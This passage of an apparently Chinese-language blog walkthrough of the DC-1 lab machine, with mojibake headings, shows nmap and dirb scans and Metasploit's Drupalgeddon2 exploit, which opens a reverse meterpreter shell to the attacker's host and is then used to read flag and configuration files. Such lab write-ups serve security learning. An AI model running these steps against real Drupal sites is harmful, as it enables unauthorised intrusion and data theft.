(RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36531/tcp6  status</span><br><span class="line">|   100024  1          41087/tcp   status</span><br><span class="line">|   100024  1          48070/udp6  status</span><br><span class="line">|_  100024  1          50997/udp   status</span><br><span class="line">41087/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:45:E3:65 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.80 ms 192.168.1.3</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.37 seconds</span><br></pre></td></tr></table></figure>

<h2 id="0x03-ç”±äºå‘ç°äº†22ä¸80ç«¯å£ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´æˆ–è€…è®¿é—®ä¸€ä¸‹"><a href="#0x03-ç”±äºå‘ç°äº†22ä¸80ç«¯å£ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´æˆ–è€…è®¿é—®ä¸€ä¸‹" class="headerlink" title="0x03.ç”±äºå‘ç°äº†22ä¸80ç«¯å£ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´æˆ–è€…è®¿é—®ä¸€ä¸‹"></a>0x03.ç”±äºå‘ç°äº†22ä¸80ç«¯å£ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´æˆ–è€…è®¿é—®ä¸€ä¸‹</h2><p><code>è¿™é‡Œå…ˆè®¿é—®ä¸€ä¸‹</code></p>
<img src="/2020/08/21/DC-1/image-20200820192812864.png" class>

<p><code>æ„Ÿè§‰åƒä¸€ä¸ªcmsï¼Œå…ˆwikiä¸€ä¸‹ï¼Œæœç„¶è¿™æ˜¯ä¸€ä¸ªç”±PHPå†™çš„å¼€æºcmsğŸ˜œ</code></p>
<img src="/2020/08/21/DC-1/image-20200820193047316.png" class>

<h2 id="0x04-æ¥ä¸‹æ¥å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ"><a href="#0x04-æ¥ä¸‹æ¥å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ" class="headerlink" title="0x04.æ¥ä¸‹æ¥å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ"></a>0x04.æ¥ä¸‹æ¥å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ</h2><p><code>å¯ä»¥å‘ç°robots.txtï¼Œæ­¤æ–‡ä»¶ç”¨æ¥é˜²çˆ¬è™«ï¼Œæ–‡ä»¶å†…å®¹ä¸€èˆ¬ä¸ºä¸æƒ³è®©äººçœ‹åˆ°çš„</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># dirb http://192.168.1.3 </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Aug 20 07:38:44 2020</span><br><span class="line">URL_BASE: http://192.168.1.3/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.1.3/ ----</span><br><span class="line">+ http://192.168.1.3/0 (CODE:200|SIZE:7564)                           </span><br><span class="line">+ http://192.168.1.3/admin (CODE:403|SIZE:7652)                       </span><br><span class="line">+ http://192.168.1.3/Admin (CODE:403|SIZE:7497)                       </span><br><span class="line">+ http://192.168.1.3/ADMIN (CODE:403|SIZE:7497)                       </span><br><span class="line">+ http://192.168.1.3/batch (CODE:403|SIZE:7787)                         </span><br><span class="line">+ http://192.168.1.3/cgi-bin/ (CODE:403|SIZE:287)                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/includes/                             </span><br><span class="line">+ http://192.168.1.3/index.php (CODE:200|SIZE:7564)                     </span><br><span class="line">+ http://192.168.1.3/install.mysql (CODE:403|SIZE:292)                     </span><br><span class="line">+ http://192.168.1.3/install.pgsql (CODE:403|SIZE:292)                     </span><br><span class="line">+ http://192.168.1.3/LICENSE (CODE:200|SIZE:18092)                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/misc/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/modules/                             </span><br><span class="line">+ http://192.168.1.3/node (CODE:200|SIZE:7564)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/profiles/                               </span><br><span class="line">+ http://192.168.1.3/README (CODE:200|SIZE:5376)                     </span><br><span class="line">+ http://192.168.1.3/robots (CODE:200|SIZE:1561)                       </span><br><span class="line">+ http://192.168.1.3/robots.txt (CODE:200|SIZE:1561)                     </span><br><span class="line">+ http://192.168.1.3/Root (CODE:403|SIZE:283)                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/scripts/                               </span><br><span class="line">+ http://192.168.1.3/search (CODE:403|SIZE:7500)                       </span><br><span class="line">+ http://192.168.1.3/Search (CODE:403|SIZE:7500)                       </span><br><span class="line">+ http://192.168.1.3/server-status (CODE:403|SIZE:292)                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/sites/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/themes/                               </span><br><span class="line">+ http://192.168.1.3/user (CODE:200|SIZE:7417)                         </span><br><span class="line">+ http://192.168.1.3/web.config (CODE:200|SIZE:2178)                     </span><br><span class="line">+ http://192.168.1.3/xmlrpc.php (CODE:200|SIZE:42)     </span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p><code>è®¿é—®ä¸€ä¸‹å¯ä»¥å‘ç°UPGRADE.txt</code></p>
<img src="/2020/08/21/DC-1/image-20200820200917231.png" class>

<p><code>è®¿é—®UPGRADE.txtï¼Œå¯ä»¥å‘ç°æ­¤cmsçš„ç‰ˆæœ¬ä¸º7.x</code></p>
<img src="/2020/08/21/DC-1/image-20200820201127217.png" class>

<p><code>ç™¾åº¦ä¸€ä¸‹å‘ç°å­˜åœ¨RCEæ¼æ´</code></p>
<img src="/2020/08/21/DC-1/image-20200820204120867.png" class>

<h2 id="0x05-get-shell"><a href="#0x05-get-shell" class="headerlink" title="0x05.get shell"></a>0x05.get shell</h2><h3 id="1-msfä¸€æŠŠæ¢­çš„æˆ‘ç›´æ¥msf"><a href="#1-msfä¸€æŠŠæ¢­çš„æˆ‘ç›´æ¥msf" class="headerlink" title="1.msfä¸€æŠŠæ¢­çš„æˆ‘ç›´æ¥msf"></a>1.msfä¸€æŠŠæ¢­çš„æˆ‘ç›´æ¥msf</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># msfconsole -q</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span><br><span class="line">   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span><br><span class="line">   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution</span><br><span class="line">   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE</span><br><span class="line">   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index, <span class="keyword">for</span> example use 7 or use exploit/unix/webapp/php_xmlrpc_eval</span><br><span class="line"></span><br><span class="line">msf5 &gt; </span><br></pre></td></tr></table></figure>

<h3 id="2-ç”±äºæ˜¯18å¹´çš„æ´æ‰€ä»¥ä½¿ç”¨ç¬¬å››ä¸ªAPIæ³¨å…¥ï¼Œç›´æ¥æ‹¿åˆ°meterpreter-shell"><a href="#2-ç”±äºæ˜¯18å¹´çš„æ´æ‰€ä»¥ä½¿ç”¨ç¬¬å››ä¸ªAPIæ³¨å…¥ï¼Œç›´æ¥æ‹¿åˆ°meterpreter-shell" class="headerlink" title="2.ç”±äºæ˜¯18å¹´çš„æ´æ‰€ä»¥ä½¿ç”¨ç¬¬å››ä¸ªAPIæ³¨å…¥ï¼Œç›´æ¥æ‹¿åˆ°meterpreter shell"></a>2.ç”±äºæ˜¯18å¹´çš„æ´æ‰€ä»¥ä½¿ç”¨ç¬¬å››ä¸ªAPIæ³¨å…¥ï¼Œç›´æ¥æ‹¿åˆ°meterpreter shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">     Module: exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">   Platform: PHP, Unix, Linux</span><br><span class="line">       Arch: php, cmd, x86, x64</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2018-03-28</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Jasper Mattsson</span><br><span class="line">  a2u</span><br><span class="line">  Nixawk</span><br><span class="line">  FireFart</span><br><span class="line">  wvu &lt;wvu@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic (PHP In-Memory)</span><br><span class="line">  1   Automatic (PHP Dropper)</span><br><span class="line">  2   Automatic (Unix In-Memory)</span><br><span class="line">  3   Automatic (Linux Dropper)</span><br><span class="line">  4   Drupal 7.x (PHP In-Memory)</span><br><span class="line">  5   Drupal 7.x (PHP Dropper)</span><br><span class="line">  6   Drupal 7.x (Unix In-Memory)</span><br><span class="line">  7   Drupal 7.x (Linux Dropper)</span><br><span class="line">  8   Drupal 8.x (PHP In-Memory)</span><br><span class="line">  9   Drupal 8.x (PHP Dropper)</span><br><span class="line">  10  Drupal 8.x (Unix In-Memory)</span><br><span class="line">  11  Drupal 8.x (Linux Dropper)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name         Current Setting  Required  Description</span><br><span class="line">  ----         ---------------  --------  -----------</span><br><span class="line">  DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">  PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">  Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">  RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">  RPORT        80               yes       The target port (TCP)</span><br><span class="line">  SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">  TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">  VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Avoid: 3 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a Drupal property injection <span class="keyword">in</span> the Forms API. </span><br><span class="line">  Drupal 6.x, &lt; 7.58, 8.2.x, &lt; 8.3.9, &lt; 8.4.6, and &lt; 8.5.1 are </span><br><span class="line">  vulnerable.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2018-7600/</span><br><span class="line">  https://www.drupal.org/sa-core-2018-002</span><br><span class="line">  https://greysec.net/showthread.php?tid=2912</span><br><span class="line">  https://research.checkpoint.com/uncovering-drupalgeddon-2/</span><br><span class="line">  https://github.com/a2u/CVE-2018-7600</span><br><span class="line">  https://github.com/nixawk/labs/issues/19</span><br><span class="line">  https://github.com/FireFart/CVE-2018-7600</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  SA-CORE-2018-002</span><br><span class="line">  Drupalgeddon 2</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.6      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> rhosts 192.168.1.3</span><br><span class="line">rhosts =&gt; 192.168.1.3</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> lhost 192.168.1.6</span><br><span class="line">lhost =&gt; 192.168.1.6</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> payload </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                      <span class="built_in">set</span> payload php/bind_php                        <span class="built_in">set</span> payload php/meterpreter/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp              <span class="built_in">set</span> payload php/bind_php_ipv6                   <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp           <span class="built_in">set</span> payload php/download_exec                   <span class="built_in">set</span> payload php/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload multi/meterpreter/reverse_http      <span class="built_in">set</span> payload php/<span class="built_in">exec</span>                            <span class="built_in">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload multi/meterpreter/reverse_https     <span class="built_in">set</span> payload php/meterpreter/bind_tcp            <span class="built_in">set</span> payload php/reverse_perl</span><br><span class="line"><span class="built_in">set</span> payload php/bind_perl                       <span class="built_in">set</span> payload php/meterpreter/bind_tcp_ipv6       <span class="built_in">set</span> payload php/reverse_php</span><br><span class="line"><span class="built_in">set</span> payload php/bind_perl_ipv6                  <span class="built_in">set</span> payload php/meterpreter/bind_tcp_ipv6_uuid  </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.6:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.6:4444 -&gt; 192.168.1.3:52082) at 2020-08-20 08:50:40 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<h3 id="3-æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå¹¶å°è¯•ææƒï¼Œéœ¸ç‰¹ï¼Œç«Ÿç„¶æ²¡æœ‰getsystemğŸ™ƒ"><a href="#3-æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå¹¶å°è¯•ææƒï¼Œéœ¸ç‰¹ï¼Œç«Ÿç„¶æ²¡æœ‰getsystemğŸ™ƒ" class="headerlink" title="3.æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå¹¶å°è¯•ææƒï¼Œéœ¸ç‰¹ï¼Œç«Ÿç„¶æ²¡æœ‰getsystemğŸ™ƒ"></a>3.æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå¹¶å°è¯•ææƒï¼Œéœ¸ç‰¹ï¼Œç«Ÿç„¶æ²¡æœ‰getsystemğŸ™ƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: getsystem.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<p><code>ç”±äºè¦æ‰¾åˆ°5ä¸ªflagæ‰€ä»¥è¿˜æ˜¯å…ˆæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore</span><br><span class="line">100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess</span><br><span class="line">100644/rw-r--r--  1481   fil   2013-11-20 15:45:59 -0500  COPYRIGHT.txt</span><br><span class="line">100644/rw-r--r--  1451   fil   2013-11-20 15:45:59 -0500  INSTALL.mysql.txt</span><br><span class="line">100644/rw-r--r--  1874   fil   2013-11-20 15:45:59 -0500  INSTALL.pgsql.txt</span><br><span class="line">100644/rw-r--r--  1298   fil   2013-11-20 15:45:59 -0500  INSTALL.sqlite.txt</span><br><span class="line">100644/rw-r--r--  17861  fil   2013-11-20 15:45:59 -0500  INSTALL.txt</span><br><span class="line">100755/rwxr-xr-x  18092  fil   2013-11-01 06:14:15 -0400  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  8191   fil   2013-11-20 15:45:59 -0500  MAINTAINERS.txt</span><br><span class="line">100644/rw-r--r--  5376   fil   2013-11-20 15:45:59 -0500  README.txt</span><br><span class="line">100644/rw-r--r--  9642   fil   2013-11-20 15:45:59 -0500  UPGRADE.txt</span><br><span class="line">100644/rw-r--r--  6604   fil   2013-11-20 15:45:59 -0500  authorize.php</span><br><span class="line">100644/rw-r--r--  720    fil   2013-11-20 15:45:59 -0500  cron.php</span><br><span class="line">100644/rw-r--r--  52     fil   2019-02-19 08:20:46 -0500  flag1.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  includes</span><br><span class="line">100644/rw-r--r--  529    fil   2013-11-20 15:45:59 -0500  index.php</span><br><span class="line">100644/rw-r--r--  703    fil   2013-11-20 15:45:59 -0500  install.php</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  misc</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  modules</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  profiles</span><br><span class="line">100644/rw-r--r--  1561   fil   2013-11-20 15:45:59 -0500  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  scripts</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  sites</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  themes</span><br><span class="line">100644/rw-r--r--  19941  fil   2013-11-20 15:45:59 -0500  update.php</span><br><span class="line">100644/rw-r--r--  2178   fil   2013-11-20 15:45:59 -0500  web.config</span><br><span class="line">100644/rw-r--r--  417    fil   2013-11-20 15:45:59 -0500  xmlrpc.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<h3 id="4-å‘ç°flag1-txtï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™çœ‹"><a href="#4-å‘ç°flag1-txtï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™çœ‹" class="headerlink" title="4.å‘ç°flag1.txtï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™çœ‹"></a>4.å‘ç°flag1.txtï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™çœ‹</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<p><code>çœ‹æ˜¯èƒ½çœ‹ï¼Œéœ¸ç‰¹ä¸‹ä¸€ä¸ªflagåœ¨å“ªï¼Ÿï¼Ÿï¼Ÿæ ¹æ®æç¤ºï¼Œæ¯ä¸€ä¸ªå¥½çš„cmséœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä½ ä¹Ÿæ˜¯ã€‚ã€‚ã€‚ğŸ˜¥</code></p>
<p><code>æŸ¥çœ‹ç½‘ç«™é…ç½®æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; cat web.config</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.webServer&gt;</span><br><span class="line">    &lt;!-- Don<span class="string">&#x27;t show directory listings for URLs which map to a directory. --&gt;</span></span><br><span class="line"><span class="string">    &lt;directoryBrowse enabled=&quot;false&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;rewrite&gt;</span></span><br><span class="line"><span class="string">      &lt;rules&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Protect files and directories from prying eyes&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|^(\..*|Entries.*|Repository|Root|Tag|Template)$&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;CustomResponse&quot; statusCode=&quot;403&quot; subStatusCode=&quot;0&quot; statusReason=&quot;Forbidden&quot; statusDescription=&quot;Access is forbidden.&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Force simple error message for requests for non-existent favicon.ico&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;favicon\.ico&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;CustomResponse&quot; statusCode=&quot;404&quot; subStatusCode=&quot;1&quot; statusReason=&quot;File Not Found&quot; statusDescription=&quot;The requested file favicon.ico was not found&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;conditions&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;/conditions&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- Rewrite URLs of the form &#x27;</span>x<span class="string">&#x27; to the form &#x27;</span>index.php?q=x<span class="string">&#x27;. --&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Short URLs&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;^(.*)$&quot; ignoreCase=&quot;false&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;conditions&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsDirectory&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;URL&#125;&quot; pattern=&quot;^/favicon.ico$&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;/conditions&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;Rewrite&quot; url=&quot;index.php?q=&#123;R:1&#125;&quot; appendQueryString=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">      &lt;/rules&gt;</span></span><br><span class="line"><span class="string">    &lt;/rewrite&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;httpErrors&gt;</span></span><br><span class="line"><span class="string">      &lt;remove statusCode=&quot;404&quot; subStatusCode=&quot;-1&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;error statusCode=&quot;404&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;/index.php&quot; responseMode=&quot;ExecuteURL&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;/httpErrors&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;defaultDocument&gt;</span></span><br><span class="line"><span class="string">      &lt;!-- Set the default document --&gt;</span></span><br><span class="line"><span class="string">      &lt;files&gt;</span></span><br><span class="line"><span class="string">        &lt;remove value=&quot;index.php&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;add value=&quot;index.php&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;/files&gt;</span></span><br><span class="line"><span class="string">    &lt;/defaultDocument&gt;</span></span><br><span class="line"><span class="string">  &lt;/system.webServer&gt;</span></span><br><span class="line"><span class="string">&lt;/configuration&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt; </span></span><br></pre></td></tr></table></figure>

<p><code>æ¢ä¸ªæ€è·¯ï¼Œç«Ÿç„¶æ˜¯web applicationé‚£å°±æœ‰æ•°æ®åº“ï¼Œé‚£ä¹ˆæ•°æ®åº“çš„å¯†ç æ˜¯ä»¥æ˜æ–‡çš„æ–¹å¼å†™åœ¨é…ç½®æ–‡ä»¶ä¸­</code></p>
<p><code>ä¸€ç•ªè‹¦é€¼çš„æŸ¥æ‰¾ï¼Œä»–åœ¨sites/default/settings.phpä¸­</code></p>
